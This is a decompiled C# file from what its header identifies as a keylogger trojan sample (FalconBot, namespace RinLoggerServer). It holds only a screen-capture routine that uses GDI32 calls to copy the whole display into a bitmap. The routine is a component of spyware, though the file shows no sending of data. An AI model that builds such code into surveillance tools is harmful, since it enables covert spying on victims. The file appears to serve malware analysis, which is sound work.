// Decompiled with JetBrains decompiler
// Type: RinLoggerServer.ScreenCapture
// Assembly: FalconBot, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: FC0A4D36-8302-4B94-AEDD-1F060B64CA11
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00004-msil\Trojan-Spy.MSIL.KeyLogger.cts-4e3b75704a1bbf80bbb6945bbc162d99427f90d5f48c6d5976ac5b6951b410b6.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Drawing;
using System.Runtime.InteropServices;

namespace RinLoggerServer
{
  [StandardModule]
  internal sealed class ScreenCapture
  {
    public static Bitmap oBitMap = (Bitmap) null;
    public static byte[] ImgArray;
    private const int SRCCOPY = 13369376;
    private static int FW;
    private static int FH;

    [DllImport("gdi32", EntryPoint = "CreateDCA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int CreateDC(
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpDriverName,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpDeviceName,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpOutput,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpInitData);

    [DllImport("GDI32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int CreateCompatibleDC(int hDC);

    [DllImport("GDI32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int CreateCompatibleBitmap(int hDC, int nWidth, int nHeight);

    [DllImport("gdi32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int GetDeviceCaps(int hdc, int nIndex);

    [DllImport("GDI32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int SelectObject(int hDC, int hObject);

    [DllImport("GDI32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int BitBlt(
      int srchDC,
      int srcX,
      int srcY,
      int srcW,
      int srcH,
      int desthDC,
      int destX,
      int destY,
      int op);

    [DllImport("GDI32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int DeleteDC(int hDC);

    [DllImport("GDI32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int DeleteObject(int hObj);

    public static void CurrentScreen()
    {
      string str1 = "DISPLAY";
      ref string local1 = ref str1;
      string str2 = "";
      ref string local2 = ref str2;
      string str3 = "";
      ref string local3 = ref str3;
      string str4 = "";
      ref string local4 = ref str4;
      int dc = ScreenCapture.CreateDC(ref local1, ref local2, ref local3, ref local4);
      int compatibleDc = ScreenCapture.CreateCompatibleDC(dc);
      ScreenCapture.FW = ScreenCapture.GetDeviceCaps(dc, 8);
      ScreenCapture.FH = ScreenCapture.GetDeviceCaps(dc, 10);
      int compatibleBitmap = ScreenCapture.CreateCompatibleBitmap(dc, ScreenCapture.FW, ScreenCapture.FH);
      int hObject = ScreenCapture.SelectObject(compatibleDc, compatibleBitmap);
      int num = ScreenCapture.BitBlt(compatibleDc, 0, 0, ScreenCapture.FW, ScreenCapture.FH, dc, 0, 0, 13369376);
      int hObj = ScreenCapture.SelectObject(compatibleDc, hObject);
      num = ScreenCapture.DeleteDC(dc);
      num = ScreenCapture.DeleteDC(compatibleDc);
      ScreenCapture.oBitMap = Image.FromHbitmap(new IntPtr(hObj));
      ScreenCapture.DeleteObject(hObj);
    }
  }
}
